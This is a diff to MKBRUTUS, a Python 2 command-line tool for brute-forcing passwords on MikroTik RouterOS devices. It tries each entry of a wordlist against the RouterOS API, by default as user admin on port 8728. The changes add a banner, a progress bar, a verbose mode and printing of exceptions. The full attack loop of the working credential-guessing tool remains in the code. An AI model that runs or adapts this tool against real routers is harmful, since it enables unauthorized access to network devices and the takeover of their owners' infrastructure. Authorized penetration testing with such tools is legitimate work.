@@ -1,7 +1,17 @@
 # -*- cding:o utf-8 -*-
 
 """
-MKBRUTUS - Password bruteforcer for MikroTik devices or boxes running RouterOS
+          _    _  _   _  _____  ____ _   _  ____ _   _ _____
+         |  \/  || | / /| ___ \ ___ \ | | |_   _| | | /  ___|
+         | .  . || |/ / | |_/ / |_/ / | | | | | | | | \ `--.
+         | |\/| ||    \ | ___ \    /| | | | | | | | | |`--. \\
+         | |  | || |\  \| |_/ / |\ \| |_| | | | | |_| /\__/ /
+         \_|  |_/\_| \_/\____/\_| \_|\___/  \_/  \___/\____/
+                      Mikrotik RouterOS Bruteforce Tool 1.0.2
+           Ramiro Caire (@rcaire) & Federico Massa (@fgmassa)
+                    http://mkbrutusproject.github.io/MKBRUTUS
+
+Password bruteforcer for MikroTik devices or boxes running RouterOS
 
 Usage:
     mkbr.py [options] <TARGET> <DICT>
@@ -9,12 +19,12 @@ Usage:
     mkbr.py --version
 
 Options:
-    -h, --help,         Show this screen.
-    --version,         Show version.
-    -p, --port=<port>  RouterOS port [default: 8728]
-    -u --user=<user>,  User name [default: admin].
-    -s --seconds=<s>   Delay seconds between retry attempts [default: 0]
-    -q, --quiet        Quiet mode.
+    -h --help,          Show this screen.
+    -v --version,       Show version.
+    -p --port=<port>    RouterOS port. [default: 8728]
+    -u --user=<user>    User name [default: admin].
+    -s --seconds=<s>    Delay seconds between retry attempts [default: 0]
+    -v --verbose        Verbose mode.
 """
 
 from docopt import docopt
@@ -22,14 +32,7 @@ import time
 import sys
 import codecs
 import routeros_api
-
-
-def run(pwd_num):
-    run_time = "%.1f" % (time.time() - t)
-    status = "Elapsed Time: %s sec | Passwords Tried: %s" % (run_time, pwd_num)
-    bar = "_" * len(status)
-    print(bar)
-    print(status + "\n")
+import pyprind
 
 
 def main(args):
@@ -46,8 +49,8 @@ def main(args):
             'password'
         )
         success = True
-    except:
-        pass
+    except Exception, e:
+        print e
 
     if success:
         alert = "[+] Login successful!!!"
@@ -69,11 +72,12 @@ def main(args):
         psswd_count = dict_file.read().count('\n')
         dict_file.seek(0)
         items = 0
+        my_bar = pyprind.ProgPercent(psswd_count, stream=1, monitor=True)
 
         for password in dict_file.readlines():
             password = password.strip('\n\r ')
             items += 1
-            if not args['--quiet']:
+            if args['--verbose']:
                 alert = "[-] Trying {} of {} passwords".format(
                     str(items), str(psswd_count))
                 print alert + " - current: " + password
@@ -92,21 +96,21 @@ def main(args):
                 break
             except:
                 pass
-
+            print ""
+            if not args['--verbose']:
+                my_bar.update()
             time.sleep(int(args['--seconds']))
 
+        print my_bar
         print ''
         print "[*] ATTACK FINISHED!"
         if not success:
             print "Try again with a different wordlist."
 
-        run(items)
-
 
 if __name__ == '__main__':
     try:
         args = docopt(__doc__, version='v1.0.2')
-        t = time.time()
         main(args)
     except KeyboardInterrupt:
         print '\nAborted by user. Exiting... '
